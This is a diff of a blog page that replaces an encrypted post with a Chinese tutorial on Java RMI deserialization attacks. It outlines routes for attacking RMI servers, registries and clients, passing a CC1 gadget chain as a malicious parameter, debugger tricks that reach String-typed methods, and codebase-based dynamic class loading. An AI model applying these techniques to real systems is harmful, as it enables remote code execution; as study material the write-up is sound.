@@ -4,9 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="总结, Ethe&#39;s blog">
-    <meta name="description" content="
-  d55db17c59acd0a076373f5618149936d6336804120d7706b0bd474d7690c83560f5b1a2978403e63d06e384fd2b3216f60ffceb2be10fe923607">
+    <meta name="keywords" content="RMI攻击（二）, Ethe&#39;s blog">
+    <meta name="description" content="前言在第一篇的时候已经分析了RMI整个调用的流程，所以在这里就写一下攻击的流程
+根据第一篇的分析
+我们已知
+攻击服务端1.UnicastServerRef#dispatch -&amp;gt; UnicastServerRef#unmarshalV">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>总结 | Ethe&#39;s blog</title>
+    <title>RMI攻击（二） | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -322,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">总结</h1>
+                    <h1 class="description center-align post-title">RMI攻击（二）</h1>
                 </div>
             </div>
         </div>
@@ -457,8 +459,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E9%9A%8F%E7%AC%94/">
-                                <span class="chip bg-color">随笔</span>
+                            <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                <span class="chip bg-color">web学习</span>
+                            </a>
+                        
+                            <a href="/tags/Java/">
+                                <span class="chip bg-color">Java</span>
                             </a>
                         
                     </div>
@@ -473,28 +479,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-08-31
+                    2023-05-18
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-07-14
+                    2023-05-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4
+                    4.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    20 分
                 </div>
                 
 
@@ -517,18 +523,401 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="5677275062678a5c9c44bfabd2f6072fe42f9134209fe5836670b29d93f78849">d55db17c59acd0a076373f5618149936d6336804120d7706b0bd474d7690c83560f5b1a2978403e63d06e384fd2b3216f60ffceb2be10fe923607ba2a3f63da8dddc37422310a5b600da568983241b725ebb5784573b4837f12f9dfee6e1d0dd72e209714b32d93b0ef55fc4e7a89ab29ff4b089ed27a2d7ceb9fc648019985b7390adb30c8609a460946f3062435e69322430a5308708dad4ec31d253a7f50c0d40efb9763bc49f51563d7895f3aeb111974faf9dac8a2c3c3824ca78636021bfd6b5ea6f7b652b789dd74c4a4650f9769ac39412bf77dba8039614a7816ab2c3c4b0dc3cc3c8d2eebc8b88f8ea40ae1bb10c76e607fa8a630542d168a6ae50bcc89de5ff84693b17defce908f8a5bf6309fa24d6ce350cb3ca8adbe5127c64086aa20800d04df45911058fce610491c6975ae1a924cd4901f6a74788827e7e24480e2e6548ba6fdf886aaf6b260658792c19243b331f67fa6cb07f1db1a55274926c816ce8d54f5ef7da0b55c9dd511715b3edfd2114a3c98a7131ab1eccb16401d375549f5fa8d7119af8b9ce652ba14588b606c5fcd1dff4ce9660d3de222482e15a304a5e112eb4f3a6c15bd6ea6627fa2fad47fa71c98bf7e8de3d188024847a5f3942567732d3ea3b7808dc6fb04f2e4e1a105fd3bb9073969c6ed1c884e554f30400bf6a9d5add149fe3b9f270184401c3c174e485188c7ac1984e0d67a1a478848747e7c862e4ce79196b45739a65c80d4a340807428a0cb663e013a226f62c6452998d654025723019424810984d8644456843241b81f93b31d6b62e0e925835559587e9d28921df407dade7f5ff57cdbf580a302c9dff98099c8c6709c5e097943f98a5e5acf496175aa3e021bcac9c8f551befea08d751c926164108f6285b230901fab837ef76cde010a9505a37f1ebd35e637e327b04261283b52c431616922a5447d79146af67d69c3a20cc041957c5b49a1bcb10b8c1a3364627c919ca24082e1be6c50bab5c40b3046c0ca8ffc81d43eb2ffdeee91765ba936d5cc2812f169002f5fd2a1c31fb36b187cc395c19d627de06b6fa1e23faae9536060c63bc2a8dc5cac939755dce2f5c6462fcdc7b24aca17da09a4e752614124669e45267e36b901e9cbb3064e3f260980faf571f8c63311d08358d30377fdb701f26baff3ed841dbc60ef85f8ea6ac432728ae4f43cec3f9214daf1b4512f28a2ee15caefa12717f3267c55ad789bc1ae73a46594b642177318cbdbe574322941391b3888aa0d7572213ac6754bb0fc6f7aafabc38f5e7c8bbebaee0c2fae7583165d60f7c1f45843f21ac318cdf5f18aa18e84539223e44ee228b9f361918713439968d8c2f8f8320b7f2d92ee0a2d5fe30c8b83abf0e8397235d27e60007d8ded1908898bf1e7b06a7c855446e4d7026cf5df83d65506515bd651b7afd573a83fe5a99410299324ef482acd8c902af37151fcbcae541a4114831290147ec6abb1da8e96e2fac437a8eefbcd522f865a869ba6672ebbc2f863f2da081c5452be323f93fc7ca92b15960c03c20280333eb9ab2741da3e0b704e2cf6fb0baecb5e1ab187b8647dfed656fde0f8403fa8513c29cdcd5d1ba622c70400ee30a6250c5ac0788e2d582c480b78e2534173ea824cf3008c777426a934cc3b45c0ba7986b8502b1c485cea2aeb797ad1b11bc9a325b53e57e65c1170d575ecd3facb7fa4c1f71739b71af5c500c9953865fa3fb3b59afc91e5ca83dfbe42dbf0e0287206d10f4117c02af60756e5d12b688cef3347f5d002af507fef80ae4a47565a03555dd72db5c5091874219183eaf07440d05b7acc12bab4f82e08ec2b6c7b8f90fa0b8eeef36e672fd13ae9fe5c4623d10fca00ffcddd381f6e3bdcd61a27208cdc6b85dbef789e547df128b43141236235c3cb5659343975f18599da5bca54677d8bc8fc2ff8a9a045869d7f79ccd9a62f48c5541dcd98bc2913f467c230bc2f66a3caa445d7725b6011aea809d7e110cb3bd2bc0ffc0ec1098f87607c3eac77de16c100ad2207f6ad75c412fdcaed7a110255f4dbc717a6a68eeb745e780c80b8afab0a6913cdc3e2b67c72d33787fafede28615ce6c918077b5a5f6252e8cd842ebcfe76e9b24fc4f2c86649acbb6c15c928defdc024756ac6c3fd89d20873c6beba1648a209b02a52ac915617917b57ef07db9da4d461f1686f865cc12a76a367451661146c94342952dfe978162f69e701a2f4398d0365ad3ac7a35e7e56081048072cfe882c1840cd3072942d7f228c9a643afb974ac87e47309af143c2e4a036af10222abadd2235997aaa516b232fd7c340dd916ed6e7eee5e6640803754d9d7ab41ad394f3b065941bf735593879fa9003eeb3dc1f31cb6d6a78968b0b6721a50e6619c6298075d1c93f541430d72c0702354211070a71980599e23590bb48278023580c86d4c5f550368ee635cf7e5e1c99fc60a87c5f814c1e3a87ea169a937466680ab71a938782465339cd9d9d95a467cbc0dee85cbb83019e6a4c0d871ea078debcab92d87623538040ec7a6c720d22de139628328d2eedca4039e259909ffe16b377650a2cdb09d4c366a8d3eb5761fcdad71fc11d5b3c01deb84417b2cddef921fef14a0c1e438f92a1551ca33b302a8e5c71693626940d6848d334e28c9a80fdd3cff723173b1a9be2e8d759dc7a8bba376a2a6d1f2d137db06fa6852e6bf0124e7975f938dcb0864c03890ac758729217df4bc3c141e2444b0758b6c0294f602d3a52a704e136bd9602bd3bf361beba9ac2840a5ae607ea53bcd017352bbe883c367ba8e463478e18c6b4e83c9cb1da9839ce369cc99a2e39dcaf3709162de8456cdd8ab428f76f4eb3ffdadd2fbc7ce472f5cc2005330e601358f1423549604c9a1edafca428268ccf418a0919dcfd9c10e1bd60640403581c09865f5cfc824c7a43fda69bea65c007ca571a7572079ba33365968cf336f01241e206eca1dba23bddd2d89862244ae5fca386d074d43281510cfd24bf93ccef5ede1b6f8e890a5327a0edb94b5a1a184024f61efb9d11d3fc3c4bb7c09620c6ac1575cb4f593c4c955b08c1cfbbbbb7accb336d32af0dabdd01c42d415b358f70c8527e1b4425460795b2b0cb600493de28e6be78704b1adbe29517171f2f333127a3e3388d3a12eccbd884f443a8206e4f6187c1e0f39649352591f57d3b9a09abee25a0533b09790a509ab5e0f3f2baf0e1e6732f7df8c69c3c49991024e2941a82f1603931428f5265fcfd657d96ff262f1e61b1a41e84ff4cc695b98d9c5e8f2d0ec5761b20588c9e3e23b6770cd544df121d6d615f87742889646fe83b5465860fc1a523a2493eaeb357901a8f965b81d8d61d88250ae4eb7dc0302b79ca48527474c687a4dd51a44315dc0755a7c854ad393c4a4a767099a8b5d29637919e0bed4959a2678930b458a67168b4bf519ddade5accb727609591da812cbfbd5cb66a20f1e6f14f1abe107338f351fa9bc50eef31fc2e3134e277f01a0e8e113dc9a816c88de69263c003a1af6fec5652a636019255902ed1fc4896d4fcd86d41e52d012071196521c8beef36abb5c05b96523bafabdd309878ef92d10ddd0e18205f9de5a5d04a469b08b08be60415f5a9e91377ec89922680680f8e006d083c73318b987d0bbb6756ca07d3ef427ceb732f8a85096f58832df7f5157b57616a44b0ecbe1429e304af89efbefdd76c6c7dab397cbe5734e1ba8c75ed39641ae83d72198e2ca5379b2b6f3c21923d467a3c230d72b6eeff91426c3e7c8a5c0537fb5f6ee1728e14281090839949ac61a220355d8b9f389c8e8544a442ffa7abd108c0c59e5a07c2057f626f624898d0f4e7a3887b9294d07042a26d373a6e22bf715b8747d15d24b83b20b0c386e5e2c082101f6d1fdb7691ed869fd8b6e12842e054fdbefe52fd99aca47c7a866425fe59ef59d0207469323aab033a1857ecb9500de779083fa0127ef33f182c8efd6625207b29564c74c913cfd8dec6ed465b8e01965af4120eeee1e7ec0d0354a5899f8e3b02b2968bd9ccae917cceaa0d6a8f1c08dec2cce733f81f9a130dcf8a665ad59b41482ab9cd53e4ff281ec4395fb3a045cd6082a36692432bd8ac20507eec66af478dc1d36158eef04fd00a5a98d48de035b6704a00391ebf2c7dcbd0614917a8e834565e684bf1640e282f9c12fdd8a45f97c14cbbde7f0681e8e6f074ec8f88439a03206cf2c88321b1ca36e2cdcc6c8bdf70c2638fa0ae7e395a69b758774ce14104033ae74bd96536ba704c7c3402f6549b6368ea8fe4f7ecb442ee950cbc6f5f479dcdd8ec34498283451758c8fb52021c27c1ddd5f30c7832fa3c9aea152ac404aaebc1f677ad6207083ce94b28833beba5cddd1c2c593310a14274c57643fcccdade29a1caf4f1219f3d7693a75eaa6e0216eafec5892e2df28e335f7305d66a230a6b267f1bcc1b238bd4cc96560e1549628f3098123841edb4af544c4eff9c184789c6e9c53c834de4a58183b41d8ba874b04a406e322b5227573b7c0cf2d69a77c2934e30584f615dfbe61bad4130256c026d33216d4328f27da17e707dc805262c39f92fae4e9e720de0ef8ddda10f1aa58c957fe1f2e997fcf14b7f2441fc2aa6d8a6862736bfd23d398c57c228f538812f6202d351d38b51776f83b0f87d63b466a7f3701f5842b802d8aff3cca49ed42f8739da3b5123ce33a3d6b0a55cf0f93a2c1624f8c4314197443eeca782a316df15f0d95d6f4159903a4d97b164d8b1f5b8a73b47656b9b6a51bfef31f4caca48f26bdba25946d161766dfb5fe66a6c025d2de1ede3fb053e60fbe5b35fb0890b1d8ba4cd2d1539e9101eca772898c84b45fc910653d4cf5ac51198105e755a9a5f315154a5137838f1446f74f5aaa4ae8d820f20c76d179755046f6c6e3cb5a1aeceaa1ce8ec5c75a6730dc2dd73668fc32cd9a102cc75a809ebfcc9ee0aef33efa406d8b5e3acb17fed3ecf15810706c1560f6027b5358ea676a5334a3cf088df6b1698145241fe718cb1a451887d7c814d6f1ec3b675b9bbb36e5d6a7d242946da3e3aa20aa2002669946d3b039f549dc1bce156322dca8d19ade707c52d9c75f369e8179651f9f7cdfb33e242bafab4051c33a3817892c51f958e6189aa03c9d02433f2ae52d2eaf66bc9786880c6bc4ea4ca8d5d781ed76892c6db56a8eee0da25e7a7d62ac450309550e8600ce133d149d0b24a5728e8ffc47821ef5985cea7637e582807c1a32018a4df670a0a7ab96dd2187484603e0df7a4756247532e06b584954bc5d7886b9dea16f78333282390df1669e77d164b3def2e1df9c7dda0a400622d2bf01a2f210af495ddf1a410190ee82f5d20c1497f7c359608dbf10f1e5c4d0275a1b87c636fa37e22d00c8727bb7b192dfa6895e51be842a85310efca3c83f382ee4bd9ed11f26fa3190e229c05d486835b3497eae9d4fa7ebea0374d9479c837065b9ba1d114c74a5dbf41f31c83f42a2dbfb672b7ed24e091f77e0af73761ab3c162fdea44191bcb410034adbf47e4bf69ebd482e75c6a8daeca324158a96a586ff9f558b2f3684412c0bfc575006df7c43c9be791a568389ca147b8f78c096f63e791af72c6e2a39949ee948521dab8c02e5a85906c2182cd5e19beaf11fae42867efaa7f699f463ebba403b76d308fed97e43133ff7c032c12e82b1865c538e3cedb0958f9f4fb1a7dcaf6e95d04339059d2be655b3c5578385ff0308453fb30d45dc93cd94276e45bb8594c4de613590b796559965e55b494c6c8a5c036e4f6a304c84d39174bdcd895ffd8332e432cc2c50147df9685369044f89c2a425ebe7d5f254bfbfc067e12a3aff87960035c9cb44f35d4a45aa88d70b648f759267dbc370ede50f56b69488c940ab5806432ab37909b039e1e823cd6f22aa48aafbbb78ff201aab78a8c4d05628d961e4bc515015ddb3f4929e46ac4c5367322550fde00e9c0ba095aea13328890683055c3c6908e742838a09fcf2006aa74f810907f647a9f3d8206281d05d317b13d122e5cf36cb24d1dfcbaa0816dbc71cb957039785b186a37e84dc5be806a84904e587000af37dafd6a4bef36b4ff61dafcf6421fdffbc2b37bb6f5c454472e8f273ebfa77fa44cf17a66ef9541e01e757a157d88dc74e83a43458ac64ccf1529d236b30f8e10a7b5e8df0a3cf211e3c83e091f4f12891961dfc3728ec0d82416d73f8c166948a3ac34b3c102b6c9d3394c8bf4e3f96bf9609d2294a49f84c4740a050563590b04aba8372f863e72a3b0f33dfe1567b6750562d8b6c9577fa1082fe032aa85ee48b394aba3cd8519d1ef190e43f46430b0d4859abde5b524ef9a68dc89f0556b102c234587ea5550ec0c9c69760cf71d703d5c8deeb948ee7b73998e795408ca0339fdd1134ef05803a1e771b265a154f1ec080858637bad4cd974f6ce3a7099cec7e192713733ca56d27e7c9b6fa6fa66130d8f5cf8b3b81d36ce39c07f0b746777f0821d048c4445aa0ff4c65dc357c09b38634f02a36c7cb24e72d187152cd0d8a2df9d1e5053ee2a5cde10bcd07e0c392bf4075b154c4356fe63e43f9c9eb7aa1276e39157aa3e42239dbed3a486e9f8d67e8fe71d15c4663637dc5ecfcefa4ca62c3adb2973ea388004256780876718b67ed9adef0013c81729beb9dade55fd0d20b3fb78e490cd4b39031b045879c2f0cd16ad9a14bc4c700fd3cf6526726f356e8e2784c39cd44655cfb34ea566f42fd4220638b048b9f5a651617fda8015ec2c49c365758e38948395bfeb64225989863725531e9dadb658bba339cca96a342cee236266cbe5aad5f1ccad010d66d529ac5710cfba90e4e4dba5216af94c27d1b15cbff29f3e46fdda13946f6b95760761c4018789e3d2272fa46f9004e7d89bf8edf539c197dd3d1dd7e096191372c740d21c2ebcc2a3dc53dae5375855fe04c1dc31f789b9f9449d84293711e06b322adb4636127c5efe4cf8ce32b319529ba15983d382756cf4d956e20324bcdc4bec63bda5beb2387efdab8f49d290c2346386e3baed8859a0f64c90aea83a066087881363ecceec7a2afad788722bce097bf256747ad5d88d1c97dd75bf78684755965bab7b09859c6f4238b6df60b7c3612371327917d7116f391da151c23a139e11b5db09cccddec371f6e268bc28ae69de2b29e2c9dcf60e93a0591d407a41a530c1bb30718e690cb9524013f3ce28b6edb9fc86be434e12aae2272a244247627167ba910154756378b232ae46c26ec45865e173b77a41d577cdf20e041c0d2e2c15dd59049302f4693f940629ac88ccf4eedb6e779a6494ba3124a862010ca064039785d752ca8847be1d88d2e012f68c2ffef0d1e9242dc7b044aad4334b11abb89231a52f91395ac0a6d8d45a204072953042089fcb2b1129323061155c4b0ba402b729cdece5b133aec4b7fa844a46459b314d92079f082114fb0b46fcaa19aa4596c15f9ee76cbce76cf3b427f8cd95f00c33e880df4c6bb50f5bfce1a1c3a21b05c230f4047627354985ee8f16826813d7430e2bf5ef666301445e36499f177f56696f3a636f7e14b096db63400905db98ee8f1d23662e5719110de6175d15bf4ad412077b8270a664f39359bbadac8e3f6fe8be678877a6784eae757449d0a41e0d0ea641466c43d95daf5ccc3e4d730038f5b9dc3997dd8ac788fd46cd2c7ee0d15f266319693a81136deca960be94dcd68402351bbf740a7c0a87f4b93b8c8a21565049ac813bc55f9c27c7b3b37c845663507a4dd64e88d5d5be016525a29814069fd1f88e9c282b741d203a552473aa42660985afb27aed48c092b6cf9b9d0217161dab27155dae7b4be6fcf5344fcdb4a35508c999df6c357927525eab84120232e41dcf1e31017356974c2756183487d6bb6401c22a3254b6f8cd5dcfb3970f0269d64a0c0726ecbb7243d4e45bc7c88dd1c3d89b153baf2eab42e4ca6356131c25ee1bcea311b118dd080aefbe4f7916f7539fe7fb26c9b214cd8df8eda50828a3a3a3c4e8bc9a1bf1fdd43e77d07a6c827363b69a5e61c68bbf31731aedb81bca455bede6ff60cb6a3c0564f0de8d494a43fe5c210cff33f37d25127623e29e6e0e149179cceccf7162e1766803f3a953e6a42c61712ead90df0e41d31df24c52a5bf3f83023f209aff1fce2c38e5732e77e141011f8e5ccdd8de93b86a2dc056135508a64173df3a3203857a2445c05eb7ec0c26be1c919cdc372c1be1cc9f998c0a41b0ac108b84ef8037373a89550180ce0dd7d500702e7a582003ee3c1d62477e7c67ab9dc684cd0e0b59fa33f561253bd9d4af05e6bdb6d95c31735c408418f07ee68f8737821138748e451fdcfe8b850bfad1535762aaa063199fd00624536e45480ad2220790a68d6f82ffe9f6fda9860eb77b5f7f4793c395c7ca857e5819c8148812bc0812d2ae6a116ab48eb513a0c2e4a33e0083a6bc70cc0524ad8b5e657292c0296d886d10718fc04c8728354403a7cb63619e97fd4b6674532e97e894ddfbab9c3da5941befbd2b16bf6f2c006485c617587d3dc90c5c1cda22bd13074876776db71cc811670b93c0fd840911c68f52f26fcea316f156fadf393f69d86faa9368fc13a0de5b7e7ee8e9e19e8511ba9497c95059d7a26668f4c8f22d42ecc73ff1c9e212ab9e748055653e2cd191d35bd40b3531f75018f99537a2fde16f62f19cf5f1eda438ced1ccb9be859525abf834f087bfdc5200c4a6ad2a495ed3049d25c8ce9a871b780a276e517655e02d413aada104e82cbf04c9c383ae9390014565d125ba23b1a278fd710441149b69d999cc203c0936156e588565717ad949e4c80a9303b14543fcfecf5f7677aeb8bfaa9c27d64c9014f2bcf489cef5e3e82057c21fc092065ceea3f87404c6da6b9f9453fa8656f3075f29f2067805a7e67b8fb499c1412f37704bdcfe6509c8ef933e3f5c13f4aecf2691a5200274d7a57072ea863727049d82783ce55d37505964a46cf01c8ff184f6f7cb1fac081d330d9f4abf56db4916c914156f238960b94801270c5008abb4e3d03d0aaf28fc41ca3c020659ba65354217f32f26559c350d12e6d3b0ac925f4de9903530cbb685099da63518bad31eb9a56e1fccbdd7bc2469794a31335a75916c8ccb8e71acc76e4bae7ccda860428946241834b6d27ef53b8437fd125da967370e61a3adb9967a94d30554027c336da81b9e3e94b0f3ae85d0f498d841a5ec0bc7ef926ab9582bb1151836665fb18caba9a4d26b976445903e24d03a129506374732594d4c09dd199f8ceab0c01e7421e3c6a0f45e85b6b35e291a8394b222c8168ca8a9912d06263faae5016157fe7395f942654c6d01dfef5805b80d51c85389ad837e6529e6ab1bfb70f0a973fc7bcabfd282c36ad1e1494d01201d911fac4ec62874a853219019a5579abbc87c150ce07c22ddd7149f</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">猜猜看</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在第一篇的时候已经分析了RMI整个调用的流程，所以在这里就写一下攻击的流程</p>
+<p>根据第一篇的分析</p>
+<p>我们已知</p>
+<h2 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a><strong>攻击服务端</strong></h2><p><strong>1.UnicastServerRef#dispatch -&gt; UnicastServerRef#unmarshalValue-&gt;客户端攻击服务端</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518160745279.png" alt="image-20230518160745279"></p>
+<p><strong>2.UnicastServerRef#oldDispatch-&gt;DGCImpl_Skel#dispatch-&gt;客户端攻击服务端</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518160918311.png" alt="image-20230518160918311"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518161002709.png" alt="image-20230518161002709"></p>
+<h2 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a><strong>攻击注册中心</strong></h2><p><strong>UnicastServerRef#oldDispatch-&gt;RegistryImpl_Skel#dispatch-&gt;客户端/服务端攻击注册中心</strong></p>
+<p>这个路线和攻击服务端的DGCImpl_Skel是一样的，只不过skel不同罢了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518161205087.png" alt="image-20230518161205087"></p>
+<h2 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a><strong>攻击客户端</strong></h2><p><strong>1.RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518162838720.png" alt="image-20230518162838720"></p>
+<p>假如注册中心返回的是恶意对象，就可能在反序列化的时候被攻击</p>
+<p><strong>2.UnicastRef#invoke-&gt;StreamRemoteCall#executeCall-&gt;注册中心/服务端攻击客户端</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518161821040.png" alt="image-20230518161821040"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518161830443.png" alt="image-20230518161830443"></p>
+<p>理论上只要调用invoke方法的地方都可以被攻击，executeCall是真正处理网络请求的地方，如果请求后返回的内容的是TransportConstants.ExceptionalReturn这个错误，就会进行反序列化</p>
+<p><strong>3.DGCImpl_Stub#dirty-&gt;服务端攻击客户端</strong></p>
+<p>本质和2是一样的，只不过是通过DGCImpl_Stub调用了invoke方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518164558344.png" alt="image-20230518164558344"></p>
+<p><strong>4.UnicastRef#invoke-&gt;UnicastRef#unmarshalValue-&gt;服务端攻击客户端</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230518165513594.png" alt="image-20230518165513594"></p>
+<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>在前言里我们梳理了几种攻击的路径，接下来就来实际看看攻击方法。</p>
+<p>我们先看一下在没有java安全机制的情况下的攻击实现</p>
+<h2 id="攻击服务端-1"><a href="#攻击服务端-1" class="headerlink" title="攻击服务端"></a>攻击服务端</h2><h3 id="①-恶意服务参数"><a href="#①-恶意服务参数" class="headerlink" title="① 恶意服务参数"></a>① 恶意服务参数</h3><p>攻击路线：UnicastServerRef#dispatch -&gt; UnicastServerRef#unmarshalValue</p>
+<p>在服务端接收到客户端的参数之后，会对服务端需要接受的参数类型进行判断</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519134149753.png" alt="image-20230519134149753"></p>
+<p>假设不是基本类型，就会对传过来的内容进行反序列化，这里就可以成为我们的攻击点</p>
+<p><strong>不过这个攻击有个条件，要求服务端必须接收与传入的poc类型一致的参数，最通用的就是Object类型，且客户端必须知道服务端实现的接口内容，否则的话不会到unmarshalValue就会报错</strong></p>
+<p>然后就只需要保证传个能反序列化的poc且服务端有对应依赖就行了</p>
+<p><img src="/2023/05/18/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%BA%8C%EF%BC%89/Users/ethe/AppData/Roaming/Typora/typora-user-images/image-20230519141121767.png" alt="image-20230519141121767"></p>
+<p>我这里传了个cc1的链，代码可以看cc链的那篇文章</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519141443549.png" alt="image-20230519141443549"></p>
+<p>但是如果只能攻击接收Object类型的接口，那本来就不大的攻击面就更小了，有没有办法能够攻击接收String类型的参数呢</p>
+<p>答案是可以的</p>
+<p>一般情况下，server端和client端的接口应该是一致的，而当不一致时，client端会报错</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519163747579.png" alt="image-20230519163747579"></p>
+<p>根据报错可以知道，在UnicastServerRef.dispatch里的这一句是负责判断方法是否存在的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519163910265.png" alt="image-20230519163910265"></p>
+<p>这句话会调用hashmap的get方法，然后获取指定 key 对应对 value</p>
+<p>因为这个op是我们传进去的内容的key，和server端不同，自然不能查找到method，导致客户端报错。</p>
+<p>那就是说如果我们能够控制这个key，那么即使我们传入的是其他东西，他也会找到method，然后继续执行这段程序，然后在unmarshalValue里进行反序列化</p>
+<p>这里有四种方法</p>
+<ul>
+<li>通过网络代理，在流量层修改数据</li>
+<li>自定义 “java.rmi” 包的代码，自行实现</li>
+<li>字节码修改</li>
+<li>使用 debugger</li>
+</ul>
+<p> <del>Java Agent不会，自定义 “java.rmi” 包的代码不会，流量层修改数据不会</del></p>
+<p>这里我就只用debugger的方式改了</p>
+<p>首先，虽然通过这种方式在服务端不接收Object类型参数的时候也可以把我们的poc传过去，但是，在改的时候必须保证客户端也需要有服务端所对应的方法。比如服务端是接收String类型的sayHallo方法，那么客户端也要有这个方法才能改成功</p>
+<p>在客户端的RemoteObjectInvocationHandler类里的invokeRemoteMethod方法处下断点</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519165201947.png" alt="image-20230519165201947"></p>
+<p>改之前</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519170948543.png" alt="image-20230519170948543"></p>
+<p>改之后</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519171050931.png" alt="image-20230519171050931"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519171115833.png" alt="image-20230519171115833"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519171129010.png" alt="image-20230519171129010"></p>
+<h3 id="②-动态类加载"><a href="#②-动态类加载" class="headerlink" title="② 动态类加载"></a>② 动态类加载</h3><p>动态类加载是RMI的一个特性</p>
+<p>如果客户端在调用时，<strong>传递了一个可序列化对象</strong>，这个对象在服务端不存在，会抛出ClassNotFound 的异常，但RMI支持动态类加载，若设置了<code>java.rmi.server.codebase</code>属性，则会尝试以该地址作为额外的classpath获取<code>.class</code>并加载和反序列化，可以使用以下两者方式指定</p>
+<ul>
+<li><code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:7777/&quot;);</code></li>
+<li><code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot;</code></li>
+</ul>
+<p>但是由于一些安全限制，这个攻击方式还有一些其他条件</p>
+<ol>
+<li>由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置<code>java.security.policy</code>，这在后面的利用中可以看到。</li>
+<li>属性 <code>java.rmi.server.useCodebaseOnly</code> 的值必需为false。但是从JDK 6u45、7u21版本之后开始，<code>java.rmi.server.useCodebaseOnly</code> 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的<code>java.rmi.server.codebase</code> 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>
+</ol>
+<p>再来几点其他的东西</p>
+<ul>
+<li>动态类加载机制不区分角色，在三端中都可以触发</li>
+<li>需要在触发动态类加载机制的一端设置<code>SecurityManager</code>，否则会报错。前面也提到了</li>
+<li>需要在触态类加载机制的一端设置<code>java.rmi.server.useCodebaseOnly=false</code>，该方法用于限制该机制是否允许远程加载。</li>
